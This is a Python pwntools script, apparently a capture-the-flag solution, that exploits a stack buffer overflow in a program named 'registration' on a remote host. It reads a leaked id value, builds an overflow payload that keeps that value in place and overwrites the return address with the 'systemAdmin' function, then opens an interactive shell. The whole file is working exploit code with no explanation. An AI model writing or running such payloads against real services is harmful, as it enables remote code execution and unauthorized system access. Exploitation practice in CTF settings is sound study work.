#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./registration"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 6128)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    '''

    #gdb.attach(c, gdbcmd)
    context.log_level ='debug'

c.recvuntil('id :')
id = p64(int(c.recvuntil('\n')[:-1]))

c.sendlineafter("Name:", flat({0: "/bin/sh"}, filler = '\0', length = 0x28 - 0xc) + id + b'a' * (0xc - 8)+ p64(elf.symbols['systemAdmin']))
c.sendlineafter("email:", "sshh")



c.interactive()
c.close()
